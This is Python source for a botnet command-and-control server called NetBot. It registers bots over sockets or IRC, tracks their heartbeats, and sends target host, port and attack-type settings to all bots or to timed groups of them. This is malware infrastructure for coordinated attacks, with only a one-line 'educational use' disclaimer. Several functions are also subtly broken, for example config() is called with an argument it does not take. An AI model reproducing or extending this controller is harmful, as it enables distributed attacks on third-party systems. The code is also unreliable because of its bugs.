#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Author	 : Shankar Narayana Damodaran
# Tool 		 : NetBot v1.0
# 
# Description	 : This is a command & control center client-server code.
#              		Should be used for educational, research purposes and internal use only.
#



from dataclasses import replace
from genericpath import exists
import socket
import threading
#from termcolor import colored
from importlib import reload
from irc_class import *
from bot_class import Bot
from group_class import IrcGroupAttack
import os
import random
import time
import sys
import re

## static 
COMMUNICATION_MODE_IRC = "IRC"
COMMUNICATION_MODE_SOCKETS = "SOCKETS"

BOT_ATTACK_STATUS_HOLD = "HOLD"
BOT_ATTACK_STATUS_LAUNCH = "LAUNCH"
BOT_ATTACK_STATUS_HALT = "HALT"
BOT_ATTACK_STATUS_UPDATE = "UPDATE"
BOT_ATTACK_STATUS_OFFLINE = "OFFLINE"

COMMAND_STOP = "/stop"
COMMAND_START = "/start"
COMMAND_SET_PROPERTIES = "/setProperties"
COMMAND_PRINT_PROPERTIES = "/printProperties"
COMMAND_HELP = "/help"
COMMAND_SAVE_PROPERTIES = "/saveProperties"
COMMAND_IMPORT_PROPERTIES = "/importProperties"
COMMAND_IRC_ATTACK = "/ircAttack"

PROPERTIES_COMMUNICATION_MODE = "--communicationMode"
PROPERTIES_SOCKET_HOST = "--socketHost"
PROPERTIES_SOCKET_PORT = "--socketPort"

PROPERTIES_IRC_SERVER = "--ircServer"
PROPERTIES_IRC_PORT = "--ircPort"
PROPERTIES_IRC_CHANNEL = "--ircChannel"
PROPERTIES_IRC_CHANNEL_PASS = "--ircChannelPass"
PROPERTIES_IRC_NICK = "--ircNick"
PROPERTIES_IRC_NICK_PASS= "--ircNickPass"
PROPERTIES_IRC_PASS = "--ircPass"
PROPERTOES_IRC_VERBOSE_IRCSERVER_RESPONSES = "--ircVerboseServer"
PROPERTIES_IRC_PERMANENTMODE_MESSAGE_TIMEOUT = "--ircMessageTimeout"
PROPERTIES_IRC_ATTACK_MODE = "--ircAttackMode"

PROPERTIES_ATTACK_TARGET_HOST = "--attTargetHost"
PROPERTIES_ATTACK_TARGET_PORT = "--attTargetPort"
PROPERTIES_ATTACK_CODE = "--attCode"
PROPERTIES_ATTACK_TYPE = "--attType"
PROPERTIES_ATTACK_BURST_SECONDS = "--attBurstSeconds"

ARG_IRC_ATTACK_MODE_ALL = "ALL"
ARG_IRC_ATTACK_MODE_ALL_START = "START"
ARG_IRC_ATTACK_MODE_ALL_STOP = "STOP"
ARG_IRC_ATTACK_MODE_GROUP = "GROUP"
## IRC Config
#ircServer = "192.168.1.30" # Provide a valid server IP/Hostname
#ircPort = 6697
#ircChannel = "#normalPrivateChannel"
#ircChannelPass = "P@ssw0rd"
#ircNick = "ccc"
#ircBotnickpass = ""
#ircBotpass = ""

#ircCommandMessageTimeout = 60
#ircShowServerResponses = True

ircBotAliveTimeout = 120 # If a client exceeds this time without sending the alive message, it will be marked as disconnected.
# note that Client has a timeout for sending alive message, obviously, this timeout must be greater than client setting.

ircBotStatusUpdateTimeout = 10

# IRC static
IRC_PRIVMSG = "PRIVMSG" # its how IRC server indicates its a client message and not channel/server info, not change
IRC_BOT_BASE_NICK = "bot" # Bot base nick, must be the same in server and client but can be whatever you want
IRC_BOT_NICK_REGEX_PATTERN = ":" + IRC_BOT_BASE_NICK + "\w+" + "!" # Regex pattern to identify a bot message, generated using bot base nick
IRC_EXPECTED_BOT_ALIVE = "HEARTBEAT" # Message configured in client to tell server its connected to botnet, must be the same
IRC_DUMMY_REFRESH = "REFRESH"

# SOCKETS config
#sHost = "0.0.0.0"
#sPort = 5555


print (""" ______             ______             
|  ___ \       _   (____  \       _    
| |   | | ____| |_  ____)  ) ___ | |_  
| |   | |/ _  )  _)|  __  ( / _ \|  _) 
| |   | ( (/ /| |__| |__)  ) |_| | |__ 
|_|   |_|\____)\___)______/ \___/ \___)1.0 from https://github.com/skavngr
                                       """)


def config():
	#import netbot_config
	#netbot_config = reload(netbot_config)
	#return netbot_config.ATTACK_STATUS
	attTargetHost = properties.get(PROPERTIES_ATTACK_TARGET_HOST, "")
	attTargetPort = properties.get(PROPERTIES_ATTACK_TARGET_PORT, "")
	attCode = properties.get(PROPERTIES_ATTACK_CODE, "")
	attType = properties.get(PROPERTIES_ATTACK_TYPE, "")
	attBurstSeconds = properties.get(PROPERTIES_ATTACK_BURST_SECONDS, "")
	return attTargetHost + "_" + attTargetPort + "_" + attCode + "_" + attType + "_" + attBurstSeconds
	 
# Socket client thread
def threaded(c):
	while True:
		data = c.recv(1024)
		if not data:
			global connected
			connected = connected - 1;
			print('\x1b[0;30;41m' + ' Bot went Offline! ' + '\x1b[0m','Disconnected from CCC :', c.getpeername()[0], ':', c.getpeername()[1], '\x1b[6;30;43m' + ' Total Bots Connected:', connected,  '\x1b[0m')
			break
		c.send(config().encode())

	#c.close() #No issues commented earlier.

def ircDummyRefreshThread(ircServer, ircPort, ircChannel, ircChannelPass, ircNick, ircBotpass, ircBotnickpass):
	dIrc = IRC()
	dIrc.connect(ircServer, ircPort, ircChannel, ircChannelPass, ircNick, ircBotpass, ircBotnickpass)
	while not stopRoutine:
		dIrc.send(ircChannel, IRC_DUMMY_REFRESH)
		time.sleep(5)


# Server Communication Routine Thread
def serverCommunicationRoutine(communicationMode):
	global bots
	global connected
	global stopRoutine
	global properties	
	global ircPermanentMode
	global ircAttackGroups

	print("Server routine started, mode: " + communicationMode)

	
	if communicationMode.lower() == COMMUNICATION_MODE_SOCKETS.lower():		
		sHost = properties[PROPERTIES_SOCKET_HOST]
		sPort = properties[PROPERTIES_SOCKET_PORT]
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.bind((sHost, sPort))
		s.listen(65365)
		print("Socket opened correctly, listening connections to port " + sPort 
			+ ". Bots will be threaded and answered automatically with the attack command settings")
		while not stopRoutine:
			c, addr = s.accept()
			connected = connected + 1
			print('\x1b[0;30;42m' + ' Bot is now Online! ' + '\x1b[0m','Connected to CCC :', addr[0], ':', addr[1], '\x1b[6;30;43m' + ' Total Bots Connected:', connected,  '\x1b[0m')

			threading.Thread(target=threaded, args=(c,)).start()		
		#s.close() #No issues uncommented earlier.

	elif communicationMode.lower() == COMMUNICATION_MODE_IRC.lower():
		ircServer = properties[PROPERTIES_IRC_SERVER]
		sIrcPort = properties[PROPERTIES_IRC_PORT]
		ircChannel = properties[PROPERTIES_IRC_CHANNEL]
		ircChannelPass = properties.get(PROPERTIES_IRC_CHANNEL_PASS, "")
		ircNick = properties[PROPERTIES_IRC_NICK]
		ircBotpass = properties.get(PROPERTIES_IRC_PASS, "")
		ircBotnickpass = properties.get(PROPERTIES_IRC_NICK_PASS, "")
		ircVerbose = properties.get(PROPERTOES_IRC_VERBOSE_IRCSERVER_RESPONSES, "true")
		sIrcPermanentMessageTimeout = properties.get(PROPERTIES_IRC_PERMANENTMODE_MESSAGE_TIMEOUT, "60")
		ircPermanentMessageTimeout = 60
		if sIrcPermanentMessageTimeout.isdigit():
			ircPermanentMessageTimeout = int(sIrcPermanentMessageTimeout)

		if not ircChannel.startswith("#"):
			ircChannel = "#" + ircChannel

		irc = IRC(1)
		irc.connect(ircServer, int(sIrcPort), ircChannel, ircChannelPass, ircNick, ircBotpass, ircBotnickpass)
		lastPermanentSend = 0
		lastBotStatusUpdate = 0
		#print("Connected to IRC server and channel correctly. If you have not done it before, now you need to set the attack properties (attack mode and target), and choose between permanent all mode or group mode. Check /help if need. Press enter to continue...")
		#input()
		while not stopRoutine:
			ircResponse = ""
			ircResponses = ["",]
			try:
				# gets IRC response, print if configured
				ircResponse = irc.get_response()
			except:
				pass

			if ircResponse and not ircVerbose.lower() == "false" and not "PING :" in ircResponse:
				print(ircResponse)
			if '\n' in ircResponse:
				ircResponses = ircResponse.split('\n')
			else:
				ircResponses[0] = ircResponse


			for ircResp in ircResponses:
				# Detects alive bot
				if IRC_PRIVMSG in ircResp and \
						re.search(IRC_BOT_NICK_REGEX_PATTERN, ircResp) \
						and ircChannel in ircResp and IRC_EXPECTED_BOT_ALIVE in ircResp:				
					botNick = extractIrcNick(ircResp)
					newBot = existsBot(botNick)
					if not newBot:				
						newBot = Bot(botNick,time.time(),BOT_ATTACK_STATUS_HOLD)
						bots.append(newBot)
						print("New bot added, welcome " + botNick + ". Current bots: " + str(numberOfAvailableBots()))
					elif newBot.currentStatus == BOT_ATTACK_STATUS_OFFLINE:
						newBot.lastHeartbeat = time.time()
						newBot.currentStatus = BOT_ATTACK_STATUS_HOLD
						print("Bot reconnected, nice to see you again " + botNick + ". Current bots: " + str(numberOfAvailableBots()))
					else:
						newBot.lastHeartbeat = time.time()

			# Get current seconds time
			tNow = time.time()

			# Update bots status (marks offline if a bot lastHeartbeat exceeds ircBotAliveTimeout)
			if tNow - ircBotStatusUpdateTimeout >= lastBotStatusUpdate:
				updateBotsStatus(tNow)
				lastBotStatusUpdate = tNow
			 
			# Sends Command Message every timeout seconds configured					
			if ircPermanentMode and tNow - ircPermanentMessageTimeout >= lastPermanentSend:
				irc.send(ircChannel, config())
				lastPermanentSend = tNow	
				print("IRC MODE ALL, attack settings sended to IRC channel: " + config())

			
			if len(ircAttackGroups) > 0:
				for group in ircAttackGroups:
					if not group.startSendedTime:						
						irc.send(ircChannel, group.startAttackSettings)
						group.startSendedTime = tNow
					elif not group.stopSendedTime:
						if tNow - group.startSendedTime >= group.attackDuration:
							irc.send(ircChannel, group.stopAttackSettings)
							group.stopSendedTime = tNow 
	print("SERVER ROUTINE ENDED")




def createNewIrcAttackGroup(numberOfBots, attackDuration):
	#global ircAttackGroups
	botNicks = assignBotsToAttackGroup(numberOfBots)
	gAttackSettings = config(BOT_ATTACK_STATUS_LAUNCH) + "_"
	gFirst = True
	for gBotNick in botNicks:
		if not gFirst:
			gAttackSettings += ";" + gBotNick
		if gFirst:
			gFirst = False
			gAttackSettings += gBotNick
	gStopAttackSettings = gAttackSettings.replace(BOT_ATTACK_STATUS_LAUNCH, BOT_ATTACK_STATUS_HOLD)
	msAttackDuration = attackDuration * 60000
	newGroup = IrcGroupAttack(botNicks, None, None, msAttackDuration, gAttackSettings, gStopAttackSettings)
	ircAttackGroups.append(newGroup)

def assignBotsToAttackGroup(numberOfBots):
	botnicks = []
	botsAdded = 0
	for bot in bots:
		if bot.currentStatus == BOT_ATTACK_STATUS_HOLD:
			botnicks.append(bot.nick)
			botsAdded += 1
			if botsAdded == numberOfBots:
				break
	return botnicks
	
def checkProperties():
	#global properties	
	pComMode = properties.get(PROPERTIES_COMMUNICATION_MODE, None)

	if not pComMode:
		print(f"For start an attack you need to set {PROPERTIES_COMMUNICATION_MODE} to 'sockets' or 'irc'. Use /setProperties, check /help if need")
		return False
	
	if pComMode.upper() == COMMUNICATION_MODE_SOCKETS:
		pHost = properties.get(PROPERTIES_SOCKET_HOST, None)
		pPort = properties.get(PROPERTIES_SOCKET_PORT, None)

		if not pHost or not pPort:
			print(f"For socket communication you need to specify {PROPERTIES_SOCKET_HOST} and {PROPERTIES_SOCKET_PORT}")
			return False
	elif pComMode.upper() == COMMUNICATION_MODE_IRC:
		pIrcServer = properties.get(PROPERTIES_IRC_SERVER, None)
		pIrcPort = properties.get(PROPERTIES_IRC_PORT, None)
		pIrcChannel = properties.get(PROPERTIES_IRC_CHANNEL, None)
		pIrcNick = properties.get(PROPERTIES_IRC_NICK, None)
		if (not pIrcServer or not pIrcPort or not pIrcChannel or not pIrcNick):
			print(f"For IRC communication you have to specify, at least: {PROPERTIES_IRC_SERVER} {PROPERTIES_IRC_PORT}" +
					f"{PROPERTIES_IRC_CHANNEL} {PROPERTIES_IRC_NICK}")
			return False
	else:
		print(f"You have to specify a valid communication mode, '{COMMUNICATION_MODE_IRC}' or '{COMMUNICATION_MODE_SOCKETS}'")
		return False
	
	return True
	
	
def startServerRoutine():
	global stopRoutine
	global tServerRoutine

	if not tServerRoutine or not tServerRoutine.is_alive():
		stopRoutine = False
		tServerRoutine = threading.Thread(target=serverCommunicationRoutine, args=(properties[PROPERTIES_COMMUNICATION_MODE],))
		tServerRoutine.start()
	else:
		print("Routine its already running")

def stopServerRoutineAndWait():
	global stopRoutine
	global tServerRoutine
	if tServerRoutine and tServerRoutine.is_alive():
		stopRoutine = True
		tServerRoutine.join()
	else: 
		print("Routine not started, nothing to stop")

def checkAttackProperties():
	attTargetHost = properties.get(PROPERTIES_ATTACK_TARGET_HOST, "")
	attTargetPort = properties.get(PROPERTIES_ATTACK_TARGET_PORT, "")
	attCode = properties.get(PROPERTIES_ATTACK_CODE, "")
	attType = properties.get(PROPERTIES_ATTACK_TYPE, "")
	attBurstSeconds = properties.get(PROPERTIES_ATTACK_BURST_SECONDS, "")
	if not attTargetHost or not attTargetPort or not attCode or not attType or not attBurstSeconds:
		return False
	return True

def setProperties(args):
	#global properties

	if len(args) % 2 == 0:
		print("Arguments malformed, all arguments are key value, must be pair.")
		return

	i = 1
	lastArg = ""
	for arg in args:
		if i % 2 == 0:
			if not arg.startswith("--"):
				print("Argument malformed, must start with --. If there were well-formed args before the bad one, they must be added.")
				return
			lastArg = arg
		elif i != 1:
			properties[lastArg] = arg			
		i+=1

def saveProperties(sInput):
	if len(sInput.split()) != 2:
		print("You need to specify one argument, the filename or path. Check /help if need.")
		return
	fProperties = None
	try:
		fProperties = open(sInput.split()[1], "x")
	except:
		print("Failed when creating the file, check if the path is correct or file doesnt already exists")
		return
	
	toWrite = "/setProperties"
	for prop in properties:
		toWrite += " " + prop + " " + properties[prop]
	fProperties.write(toWrite)
	fProperties.close()
	print("File created correctly, use '/importProperties [path]' when need")

def importProperties(sInput):
	if len(sInput.split()) != 2:
		print("You need to specify one argument, the filename or path. Check /help if need.")
		return
	fProperties = None
	try:
		fProperties = open(sInput.split()[1], "r")
	except:
		print("Failed when reading the file, check if the path is correct and file exists")
		return
	fPropertiesInput = fProperties.read().split()
	fProperties.close()
	setProperties(fPropertiesInput)
	print("Properties imported")

def numberOfAvailableBots():
	count = 0
	#global bots
	for bot in bots:
		if bot.currentStatus == BOT_ATTACK_STATUS_HOLD:
			count += 1
	return count

def extractIrcNick(ircPrivmsg):
	return ircPrivmsg[ircPrivmsg.find(':')+1:ircPrivmsg.find('!')]

def existsBot(botNick):
	#global bots
	for bot in bots:
		if bot.nick == botNick:
			return bot
	return None

def updateBotsStatus(tNow):
	#global bots
	for bot in bots:
		if bot.currentStatus != BOT_ATTACK_STATUS_OFFLINE:
			if tNow - bot.lastHeartbeat >= ircBotAliveTimeout:
				bot.currentStatus = BOT_ATTACK_STATUS_OFFLINE
				print("Bot timeout, bot disconnected, bye " + bot.nick + ". Current bots " + str(numberOfAvailableBots()))
	
def Main():
	global properties
	properties = {}
	setProperties(sys.argv)

	global connected
	connected = 0

	global bots 
	bots = []

	global ircAttackGroups
	ircAttackGroups = []

	#communicationMode = COMMUNICATION_MODE_IRC
	global stopRoutine
	stopRoutine = False

	global tServerRoutine
	tServerRoutine = None
	#tServerRoutine.start()

	global ircPermanentMode
	ircPermanentMode = False

	quit = False
	while not quit:
		sInput = input()
		if not sInput:
			continue
		
		if sInput.lower() == COMMAND_STOP.lower():
			stopServerRoutineAndWait()
		elif sInput.lower() == COMMAND_START.lower() and checkProperties():
			startServerRoutine()
		elif sInput.lower().split()[0] == COMMAND_SET_PROPERTIES.lower():
			setProperties(sInput.split())
		elif sInput.lower() == COMMAND_PRINT_PROPERTIES.lower():
			print(properties)
		elif sInput.lower().split()[0] == COMMAND_SAVE_PROPERTIES.lower():
			saveProperties(sInput)
		elif sInput.lower().split()[0] == COMMAND_IMPORT_PROPERTIES.lower():
			importProperties(sInput)
		elif sInput.lower().split()[0] == COMMAND_IRC_ATTACK.lower():
			ircAttack(sInput.split())

def ircAttack(sInputSplitted):
	global ircPermanentMode
	bAttackProp = checkAttackProperties()
	if not bAttackProp:
		print("You need to set attack properties before starting attack, check /help if need.")
		return

	if len(sInputSplitted) < 2:
		print("For /ircAttack, you need to specify the mode (all or group).")
		return


	
	if sInputSplitted[1].lower() == ARG_IRC_ATTACK_MODE_ALL.lower():
		if len(sInputSplitted) == 3:
			if sInputSplitted[2].lower() == ARG_IRC_ATTACK_MODE_ALL_START.lower():				
				ircPermanentMode = True			
				print("IRC attack mode ALL started")	
			elif sInputSplitted[2].lower() == ARG_IRC_ATTACK_MODE_ALL_STOP.lower():
				if ircPermanentMode:
					ircPermanentMode = False
					print("IRC attack mode ALL stopped")
				else:
					print("IRC attack mode ALL is not running.")
			else:
				print("Bad argument, ircAttack mode ALL only accepts start or stop.")
		else:
			print("Bad number of arguments, if ircAttack mode ALL you only need to specify start or stop")
	elif sInputSplitted[1].lower() == ARG_IRC_ATTACK_MODE_GROUP.lower():
		if len(sInputSplitted) == 4:
			if sInputSplitted[2].isdigit() and int(sInputSplitted[2]) > 0 \
			and sInputSplitted[3].isdigit() and int(sInputSplitted[3]) > 0:			
				numberOfBots = int(sInputSplitted[2])
				attackDuration = sInputSplitted[3]
				if numberOfBots <= numberOfAvailableBots:
					createNewIrcAttackGroup(numberOfBots, attackDuration)
				else:
					print("Sad you dont have that number of bots!!!")
			else:
				print("Bad number of bots or attack duration argument, both must be a valid number and greater than 0")
		else:
			print("Bad number of arguments, if ircAttack mode GROUP you need to specify first a number of bots and second the attack duration in minutes.")
	else:
		print("Bad ircAttack mode, only all or group modes allowed")	

if __name__ == '__main__':
	Main()
